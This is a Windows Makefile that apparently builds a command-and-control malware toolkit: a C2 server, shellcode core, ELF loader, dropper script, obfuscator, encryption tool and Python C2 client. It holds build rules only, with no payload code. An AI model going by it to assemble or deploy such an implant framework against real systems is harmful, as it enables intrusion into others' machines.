#Compiler and assembler settings
CC = gcc
CFLAGSWS = -lws2_32
NASM = nasm
NASMFLAGSWIN = -f win64
NASMFLAGSLIN = -f elf64
NASMFLAGSBIN = -f bin
LD = ld
LDFLAGS = -N

#Output directory
BINDIR = bin

#Targets
all: server tools modules droper gostInit usage

#Server
server: server/server_x86_64.c $(BINDIR)/tools/encrypt.obj
	@echo Starting compilation of server.exe into bin/server/
	@mkdir "$(BINDIR)\server" 2>nul || exit 0
	@$(CC) $^ -o $(BINDIR)/server/$@.exe $(CFLAGSWS)
	@powershell -Command 'Write-Host "Server was successfully compiled" -ForegroundColor Green'

#Tools
tools: encrypt obufcater hash

$(BINDIR)/tools:
	@mkdir "$@"

encrypt: $(BINDIR)/tools/encrypt.obj tools/encrypt.c
	@echo Starting compilation of encrypt.exe tool into bin/tools/
	@$(CC) $^ -o $(BINDIR)/tools/$@.exe
	@powershell -Command 'Write-Host "encrypt.exe tool was successfully compiled" -ForegroundColor Green'

obufcater: $(BINDIR)/tools/encrypt.obj tools/obufcater.c
	@echo Starting compilation of obufcater.exe tool into bin/tools/
	@$(CC) $^ -o $(BINDIR)/tools/$@.exe
	@powershell -Command 'Write-Host "obufcater.exe tool was successfully compiled" -ForegroundColor Green'

hash: tools/hash.asm | $(BINDIR)/tools
	@echo Starting compilation of hash.exe tool into bin/tools/
	@$(NASM) $(NASMFLAGSWIN) $< -o $(BINDIR)/hash.obj
	@$(CC) -nostartfiles $(BINDIR)/hash.obj -o $(BINDIR)/tools/$@.exe
	@del "$(BINDIR)\hash.obj" 2>nul
	@powershell -Command 'Write-Host "hash.exe tool was successfully compiled" -ForegroundColor Green'

$(BINDIR)/tools/encrypt.obj: tools/encrypt.asm | $(BINDIR)/tools
	@echo Assembling encrypt.asm library into bin/tools/encrypt.obj
	@$(NASM) $(NASMFLAGSWIN) $< -o $(BINDIR)/tools/encrypt.obj
	@powershell -Command 'Write-Host "Successfully assembled encrypt library" -ForegroundColor Green'

#gostInit
gostInit: core loader

$(BINDIR)/gostInit:
	@mkdir "$@"

core: gostInit/core/core.asm | $(BINDIR)/gostInit
	@echo Assembling core Gost shellcode into bin/gostInit
	@$(NASM) $(NASMFLAGSBIN) $< -o $(BINDIR)/gostInit/core.bin
	@powershell -Command 'Write-Host "Successfully assembled core shellcode" -ForegroundColor Green'

loader: gostInit/loader/loader.asm | $(BINDIR)/gostInit
	@echo Assembling loader.o into bin/gostInit
	@$(NASM) $(NASMFLAGSLIN) $< -o $(BINDIR)/gostInit/loader.o
	@powershell -Command 'Write-Host "Successfully created ELF64 loader object file" -ForegroundColor Green'
	@powershell -Command 'Write-Host "You need a Linux environment to link loader.o" -ForegroundColor Yellow'
	@powershell -Command "Write-Host 'Use ' -NoNewline -ForegroundColor Yellow; Write-Host 'ld -N loader.o -o loader' -ForegroundColor Cyan -NoNewline; Write-Host 'on a Linux environment to create ELF binary' -ForegroundColor Yellow"

#Modules
modules: x

$(BINDIR)/modules:
	@mkdir "$@"

x: modules/x.asm | $(BINDIR)/modules
	@echo Assembling x module into bin/modules/
	@$(NASM) $(NASMFLAGSBIN) $< -o $(BINDIR)/modules/x.bin
	@powershell -Command 'Write-Host "Successfully assembled x module" -ForegroundColor Green'

#droper
droper: gostInit\droper\droper.sh | $(BINDIR)/gostInit
	@copy "$<" "$(BINDIR)\gostInit\droper.sh"
	@powershell -Command 'Write-Host "Successfully copied droper.sh" -ForegroundColor Green'

#Client
client: C2Client\client.py
	@mkdir "$(BINDIR)/client"
	@copy "$<" "$(BINDIR)\client\client.py"
	@powershell -Command 'Write-Host "Successfully copied client.py" -ForegroundColor Green'

#Clean up
clean:
	@powershell -Command 'Write-Host "Cleaning up build directory" -ForegroundColor Yellow'
	@rd /s /q $(BINDIR)
	@powershell -Command 'Write-Host "Cleanup completed" -ForegroundColor Green'

usage:
	@powershell -Command 'Write-Host "D:\BIN`n|----gostInit`n|       core.bin`n|       droper.sh`n|       loader.o`n|`n|----modules`n|       x.bin`n|`n|----server`n|       server.exe`n|`n|----tools`n        encrypt.exe`n        encrypt.obj`n        hash.exe`n        obufcater.exe" -ForegroundColor Magenta'
